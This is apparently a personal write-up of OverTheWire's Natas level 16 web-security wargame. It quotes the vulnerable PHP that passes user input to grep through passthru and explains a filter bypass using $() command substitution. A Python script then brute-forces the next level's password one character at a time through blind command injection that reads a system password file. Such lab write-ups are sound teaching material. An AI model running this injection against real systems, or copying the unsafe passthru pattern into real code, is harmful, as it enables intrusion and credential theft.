<h2>🔰 Level - 16</h2>

- username - natas16
- password - TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V

	There was an input field, where we can enter a word, and the output will display all the occurences of that word within the file called "dictionary.txt". <br>

	There was a similar challenge before, but here, the key is added to grep with explicit quotes (`grep -i "<keyword> dictionary.txt`). Also now characters `;`,`"`,`'`,`|`, `&`, and backticks are filtered. <br>

	```php
	<?
	$key = "";

	if(array_key_exists("needle", $_REQUEST)) {
	    $key = $_REQUEST["needle"];
	}

	if($key != "") {
	    if(preg_match('/[;|&`\'"]/',$key)) {
	        print "Input contains an illegal character!";
	    } else {
	        passthru("grep -i \"$key\" dictionary.txt");
	    }
	}
	?>
	```

	Since a command is being executed, I figured it's got something to do with injection code remotely. On searching different ways to inject command within another command, found that we can use `$()` to execute a command and replace the current value with the output of that command. <br>
	That is, I could do `grep -i ($ls) dictionary.txt` and its valid. But the thing is, due to explicit double quotes, it only checks whether the output of internal command is present in dictionary.txt or not. Our password is not in dictionary.txt. So can't directly cat out the password. <br>

	Instead of doing `cat`, tried `grep`. That way, I could check character by character in the password. If character is present in password, then it greps the whole password and replaces the `$key` in outer grep with the password. This inturn returns nothing as output since password is not in dictionary.txt. If character is not present, then `$key` value becomes empty string. So outer grep will print out all strings in dictionary.txt. <br>

	So to check if a character is in password or not, I just have to check if there's any output or not, on doing search with corresponding character. 

	Made a python script to do the same: 

	```python
	import requests

	url = "http://natas16.natas.labs.overthewire.org/"

	username = 'natas16'
	curr_passwd = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"

	session = requests.Session()

	character_list = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

	nxt_passwd = ''

	while (len(nxt_passwd) < 32):
		for ch in character_list:
			print(f"trying {ch}")
			data = {"needle":f'$(grep ^{nxt_passwd+ch} /etc/natas_webpass/natas17)'} # ^ checks for any line starting 																		     # with given key
			response = session.post(url, auth = (username, curr_passwd), data = data)
			if ('Africans' not in response.text):
				nxt_passwd += ch
				print(nxt_passwd)
				break

	print("\n\n\nFinal Password for Natas 17:", nxt_passwd)
	```

	On each search, script checks if "Africans" is in output. If so, corresponding character was not in password. <br>

Password for level 17 - XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd